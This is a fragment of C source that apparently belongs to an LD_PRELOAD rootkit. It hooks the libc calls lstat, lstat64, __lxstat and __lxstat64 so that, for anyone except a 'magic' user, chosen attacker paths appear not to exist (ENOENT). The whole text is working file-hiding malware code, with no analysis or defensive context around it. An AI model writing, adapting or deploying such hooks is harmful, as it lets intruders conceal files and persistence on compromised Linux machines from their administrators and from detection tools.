int __lxstat(int version, const char *pathname, struct stat *buf){
    hook(C__LXSTAT);
    if(magicusr()) return (long)call(C__LXSTAT, version, pathname, buf);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__LXSTAT, version, pathname, buf);
}
int __lxstat64(int version, const char *pathname, struct stat64 *buf){
    hook(C__LXSTAT64);
    if(magicusr()) return (long)call(C__LXSTAT64, version, pathname, buf);
    if(hidden_path64(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__LXSTAT64, version, pathname, buf);
}
int lstat(const char *pathname, struct stat *buf){
    return __lxstat(_STAT_VER, pathname, buf);
}
int lstat64(const char *pathname, struct stat64 *buf){
    return __lxstat64(_STAT_VER, pathname, buf);
}